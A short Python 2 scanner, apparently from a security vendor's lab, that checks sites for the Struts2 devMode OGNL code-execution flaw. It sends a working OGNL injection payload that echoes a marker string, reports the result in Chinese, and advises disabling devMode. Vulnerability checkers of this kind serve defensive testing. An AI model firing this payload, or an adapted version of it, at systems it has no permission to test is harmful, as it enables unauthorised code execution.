#!/usr/bin/env python
#coding:utf-8 -*-
import sys
import getopt
import urllib 
import urllib2


poc = "debug=command&expression=(%23wr%3D%23context%5B%23parameters.obj%5B0%5D%5D.getWriter())!%3D(%23wr.println(%23parameters.content%5B0%5D))!%3D(%23wr.flush())!%3D(%23wr.close())&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=Adlabgsrc"

banner = '''
# S2-devMode 检测工具
# Author:venustech
# 参考：ADLab公众号
# 修复建议 ： 关闭devMode模式
#使用说明： 
检测命令 python s2-devmode.py -u http://localhost:8080/orders/3/xxx/
         例如 python s2-adlab.py -u http://223.22.22.22:8080/example/HelloWorld.action
帮助信息 python s2-devmode.py -h  

'''
def usage():
	print banner
def send_poc(geturl,data):
	try:
		user_agent = 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)' 
		headers = { 'User-Agent' : user_agent,
				'Cookie'	: ""} 
		req = urllib2.Request(geturl+"?"+data, headers=headers) 
		response = urllib2.urlopen(req) 
		content = response.read()
		if  "Adlabgsrc" in content:
			print "该网站存在s2-devmode代码执行漏洞，请及时修复"
			return True
		else:
			print "该网站安全"
			return False
	
	except urllib2.URLError, e:
		#print e.reason
		pass
	return False
	
def check_vul(url):
	if url.find("http://") | url.find("https://"):						
		send_poc(url,poc)
					
	
if __name__ == '__main__':

	opts, args = getopt.getopt(sys.argv[1:], "hu:o:")
	for op, value in opts:
		if op == "-u":
			target_url = value	
			check_vul(target_url)
		elif op == "-h":
			usage()	
	   

